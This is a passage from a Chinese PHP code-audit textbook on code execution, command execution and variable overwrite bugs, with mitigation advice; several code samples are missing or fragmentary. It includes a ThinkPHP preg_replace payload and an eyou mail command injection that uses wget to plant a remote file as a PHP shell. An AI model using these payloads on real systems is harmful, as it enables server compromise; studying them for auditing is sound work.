trim
（
$_SERVER['PATH_INFO']
，
'/'
））；
则是从$_SERVER['PATH_INFO']中以$depr为分隔符分割后的数组，而后面又用implode（）函数还原成字符串才带入preg_replace（）函数，关键在于：
'$var[\'\\1\']="\\2"
；
'
代码的意思是，把正则匹配出来的参数1初始化到$var变量中，并且赋值为参数2的值，问题是这段代码在赋值的时候使用的是双引号（"），在PHP中，如果字符串使用双引号括起来，中间的变量是会正常解析的，如：
会输出1，而不是$a，利用这个特性，再结合PHP可变变量即可执行任意代码，最终EXP为：
/index.php/module/action/param1/${@phpinfo
（）
}
5.2.2 漏洞防范
采用参数白名单过滤，在可预测满足正常业务的参数情况下，这是非常实用的方式，这里的白名单并不是说完全固定为参数，因为在eval（）、assert（）和preg_replace（）函数的参数中大部分是不可预测一字不差的，我们可以结合正则表达式来进行白名单限制，用上面的thinkphp来举例，如果我们事先已经知道这个URL里面的第二个参数值由数字构成即可满足业务需求，则可以在正则里用\d+来限制第二个参数内容，这样相对更加安全，用代码举例更加清晰易懂，代码如下：
这段代码是有问题的，只要提交/1.php？a=b|${@phpinfo（）}即可执行phpinfo（）函数，这时候如果我们知道\\2的值范围为纯数字，只要正则改成（\w+）\|（\d+）即可解决执行代码的问题，这只是一种修复方案，最好的方法是：在$\\1="\\2"这里不要用双引号。
5.3 命令执行漏洞
代码执行漏洞指的是可以执行PHP脚本代码，而命令执行漏洞指的是可以执行系统或者应用指令（如CMD命令或者bash命令）的漏洞，PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（），一共七个函数，另外反引号（`）也可以执行命令，不过实际上这种方式也是调用的shell_exec（）函数。PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大。
5.3.1 挖掘经验
命令执行漏洞最多出现在包含环境包的应用里，类似于eyou（亿邮）这类产品，直接在系统安装即可启动自带的Web服务和数据库服务，一般这类的产品会有一些额外的小脚本来协助处理日志以及数据库等，Web应用会有比较多的点之间使用system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（）等函数执行系统命令来调用这些脚本，用得多了难免就会出现纰漏导致漏洞，这类应用可以直接在代码里搜这几个函数，收获应该会不少。除了这类应用，还有像discuz等应用也有调用外部程序的功能，如数据库导出功能，曾经就出现过命令执行漏洞，因为特征比较明显，所以可以直接搜函数名即可进行漏洞挖掘。
5.3.1.1 命令执行函数
上面我们说到有七个常用函数可以执行命令，包括system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（），另外还有反引号（`）也一样可以执行命令，下面我们来看看它们的执行方式。
这些函数里system（）、exec（）、shell_exec（）、passthru（）以及反引号（`）是可以直接传入命令并且函数会返回执行结果，比较简单和好理解，其中system（）函数会直接回显结果打印输出，不需要echo也可以，我们来用代码举例。测试代码如下：
可以看到执行结果输出了当前WebServer用户，如图5-11所示。
pcntl是PHP的多进程处理扩展，在处理大量任务的情况下会使用到，使用pcntl需要额外安装，它的函数说明如下：
void pcntl_exec
（
string $path [
，
array $args [
，
array $envs ]]
）
图 5-11
其中$path为可执行程序路径，如果是Perl或者Bash脚本，则需要在文件头加上#！/bin/bash来标识可执行程序路径，$args表示传递给$path程序的参数，$envs则是执行这个程序的环境变量。
popen（）、proc_open（）函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了，我们主要关心的是这个。下面我们看看popen（）的用法，它需要两个参数，一个是执行的命令，另外一个是指针文件的连接模式，有r和w代表读和写。测试代码如下：
>D
：
/2.txt'
，
'r'
）；？
>
执行完成后可以在D盘根目录看到2.txt这个文件，内容为WebServer用户名。
5.3.1.2 反引号命令执行
上面我们讲到反引号（`）也可以执行命令，它的写法很简单，实际上反引号（`）执行命令是调用的shell_exec（）函数，为什么这么说？我们来看一段简单的代码就知道了，代码如下：
这段代码正常执行的情况下是会输出当前用户名的，而我们在php.ini里面把PHP安全模式打开一下，再重启下WebServer重新加载PHP配置文件，再执行这段代码的时候，我们会看到下面这个提示：
Warning
：
shell_exec
（）
[function.shell-exec]
：
Cannot execute using backquotes in Safe Mode in D
：
\www\test\1.php on line 2
这个提示说明反引号执行命令的方式是使用的shell_exec（）函数。
5.3.1.3 亿邮命令执行漏洞分析
命令执行的漏洞案例还是有很多的，这里挑选笔者自己挖到的比较经典的一个eyou（亿邮）的命令执行漏洞，重点在于漏洞的逻辑，而不在于漏洞的影响力有多大。
漏洞利用在/swfupload/upload_files.php文件，代码如下：
 $multiplier*
（
int
）
$POST_MAX_SIZE && $POST_MAX_SIZE
）
{
    header
（
"HTTP/1.1 500 Internal Server Error"
）；
    echo "POST exceeded maximum allowed size."
；
    exit
（
0
）；
}
//--
获得附件存放路径
存在用户的
token
目录下
$save_path = getUserDirPath
（
$uid
，
$domain
）；
  //
传入
uid
参数到
getUserDirPath
（）函数
从代码中可以看出，$uid=$_GET['uid']；表示从GET中获取uid参数，在下面一点将$uid变量传递到了getUserDirPath（）函数，跟进该函数，在/inc/function.php文件，代码如下：
function getUserDirPath
（
$uid
，
$domain
）
{
    $cmd = "/var/eyou/sbin/hashid $uid $domain"
；
    $path = `$cmd`
；
    $path = trim
（
$path
）；
    return $path
；
}
该函数拼接了一条命令：
$cmd = "/var/eyou/sbin/hashid $uid $domain"
；
可以看到$uid和$domain变量都是从GET请求中获取的，最终通过反引号（`）来执行，所以我们可以直接注入命令，最终exp为：
/swfupload/upload_files.php
？
uid=|wget+http
：
//www.x.com/1.txt+-O+/var/eyou/apache/htdocs/swfupload/a.php&domain=
表示下载http://www.x.com/1.txt到/var/eyou/apache/htdocs/swfupload/a.php文件。
5.3.2 漏洞防范
关于命令执行漏洞的防范大致有两种方式：一种是使用PHP自带的命令防注入函数，包括escapeshellcmd（）和escapeshellarg（），其中escapeshellcmd（）是过滤的整条命令，所以它的参数是一整条命令，escapeshellarg（）函数则是用来保证传入命令执行函数里面的参数确实是以字符串参数形式存在的，不能被注入。除了使用这两个函数，还有对命令执行函数的参数做白名单限制，下面我们来详细介绍。
5.3.2.1 命令防注入函数
PHP在SQL防注入上有addslashes（）和mysql_[real_]escape_string（）等函数过滤SQL语句，在命令上也同样有防注入函数，一共有两个escapeshellcmd（）和escapeshellarg（），从函数名我们可以看出，escapeshellcmd（）是过滤的整条命令，它的函数说明如下：
string escapeshellcmd
（
string $command
）
输入一个string类型的参数，为要过滤的命令，返回过滤后的string类型的命令，过滤的字符为'&'、'；'、'`'、'|'、'*'、'？'、'~'、''、'^'、'（'、'）'、'['、']'、'{'、'}'、'$'、'\'、'\x0A'、'\xFF'、’%’，'和"仅仅在不成对的时候被转义，我们在Windows环境测试下，测试代码：
结果如图5-12所示。
可以看到这些字符过滤方式是在这些字符前面加了一个^符号，而在Linux下则是在这些字符前面加了反斜杠（\）。
escapeshellarg（）函数的功能则是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，因此它会把双引号替换为空格，我们来测试一下：
图 5-12
最终输出为ls"a"
5.3.2.2 参数白名单
参数白名单方式在大多数由于参数过滤不严产生的漏洞中都很好用，是一种通用修复方法，我们之前已经讲过，可以在代码中或者配置文件中限定某些参数，在使用的时候匹配一下这个参数在不在这个白名单列表中，如果不在则直接显示错误提示即可，具体的实施代码这里不再重复。
第6章 漏洞挖掘与防范（深入篇）
在学习完基础篇和进阶篇之后，你是否对代码审计有了相对透彻的了解呢？相信现在挖掘一些常见漏洞对你来说已经so easy，那么我们将开始进入下一阶段“深入篇”。在本章，我们会介绍更多PHP特性相关的漏洞，另外对于有逻辑的漏洞也会在这篇开始介绍，是否准备好了呢？
6.1 变量覆盖漏洞
变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值，变量覆盖漏洞通常需要结合程序的其他功能来实现完整攻击，这个漏洞想象空间非常大，比如原本一个文件上传页面，限制的文件扩展名白名单列表写在配置文件中变量中，但是在上传的过程中有一个变量覆盖漏洞可以将任意扩展名覆盖掉原来的白名单列表，那我们就可以覆盖进去一个PHP的扩展名，从而上传一个PHP的shell。
变量覆盖漏洞大多由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract（）函数和parse_str（），import_request_variables（）函数则是用在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局变量注册，在PHP 5.4之后这个函数已经被取消。另外部分应用利用$$的方式注册变量没验证已有变量导致覆盖也是国内多套程序都犯过的一个问题，这些应用在使用外部传递进来的参数时不是用类似于$_GET['key']这样原始的数组变量，而是把里面的key注册成了一个变量$key，注册过程中由于没有验证该变量是否已经存在就直接赋值，所以导致已有的变量值会被覆盖掉。
6.1.1 挖掘经验
由于变量覆盖漏洞通常要结合应用其他功能代码来实现完整攻击，所以挖掘一个可用的变量覆盖漏洞不仅仅要考虑的是能够实现变量覆盖，还要考虑后面的代码能不能让这个漏洞利用起来。要挖可用的变量覆盖漏洞，一定要看漏洞代码行之前存在哪些变量可以覆盖并且后面有被使用到。
由函数导致的变量覆盖比较好挖掘，只要搜寻参数带有变量的extract（）、parse_str（）函数，然后去回溯变量是否可控，extract（）还要考虑它的第二个参数，具体细节我们后面在详细介绍这个函数的时候再讲。import_request_variables（）函数则相当于开了全局变量注册，这时候只要找哪些变量没有初始化并且操作之前没有赋值的，然后就大胆地去提交这个变量作为参数吧，另外只要写在import_request_variables（）函数前面的变量，不管是否已经初始化都可以覆盖，不过这个函数在PHP 4~4.1.0和PHP 5~5.4.0的版本可用。
关于上面我们说到国内很多程序使用双$$符号注册变量会导致变量覆盖，我们可以通过搜“$$”这个关键字去挖掘，不过建议挖掘之前还是先把几个核心文件通读一遍，了解程序的大致框架。
6.1.1.1 函数使用不当
目前变量覆盖漏洞大多都是由于函数使用不正确导致的，这些函数有extract（）、parse_str（）以及import_request_variables（），而其中最常见的就是extract（）这个函数了，使用频率最高，导致的漏洞数量也最多，下面我们分别来看看这几个函数导致的漏洞原理吧。
1.extract函数
extract（）函数覆盖变量需要一定条件，它的官方功能说明为“从数组中将变量导入到当前的符号表”，通俗讲就是将数组中的键值对注册成变量，函数结构如下：
int extract
（
array &$var_array [
，
int $extract_type = EXTR_OVERWRITE [
，
    string $prefix = NULL ]]
）
最多三个参数，我们来看看这三个参数的作用，参见表6-1。
表 6-1
从以上说明我们可以看到第一个参数是必须的，会不会导致变量覆盖漏洞由第二个参数决定，该函数有三种情况会覆盖掉已有变量，第一种是第二个参数为EXTR_OVERWRITE，它表示如果有冲突，则覆盖已有的变量。第二种情况是只传入第一个参数，这时候默认为EXTR_OVERWRITE模式，而第三种则是第二个参数为EXTR_IF_EXISTS，它表示仅在当前符号表中已有同名变量时，覆盖它们的值，其他的都不注册新变量。
为了更清楚地了解它的用法，我们来用代码来说明，测试代码如下：
'1'
）；
extract
（
$a
）；
print_r
（
$b
）；？
>
测试结果如图6-1所示。
图 6-1
原本变量$b的值为3，经过extract（）函数对变量$a处理后，变量$b的值被成功覆盖为了1。
2.parse_str函数
parse_str（）函数的作用是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否已经存在，所以会直接覆盖掉已有变量。parse_str（）函数有两个参数，函数说明如下：
void parse_str
（
string $str [
，
array &$arr ]
）
其中$str是必须的，代表要解析注册成变量的字符串，形式为“a=1”，经过parse_str（）函数之后会注册变量$a并且赋值为1。第二个参数$arr是一个数组，当第二个参数存在时，注册的变量会放到这个数组里面，但是如这个数组原来就存在相同的键（key），则会覆盖掉原有的键值。
我们来测试一下，测试代码：
测试结果可以看到变量$b原有的值1被覆盖成了2，如图6-2所示。
图 6-2
3.import_request_variables函数
import_request_variables（）函数作用是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候，需要PHP 4.1至5.4之间的版本，不过建议是不开启register_globals也不要使用import_request_variables（）函数，这样容易导致变量覆盖。该函数的说明如下：
bool import_request_variables
（
string $types [
，
string $prefix ]
）
其中$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，所以当$type为GPC的时候，则会注册GET、POST、COOKIE参数为变量。第二个参数$prefix为要注册的变量前缀，这里我们不细说，来看看它是怎么覆盖变量的，测试代码如下：
<
？
php
$b=1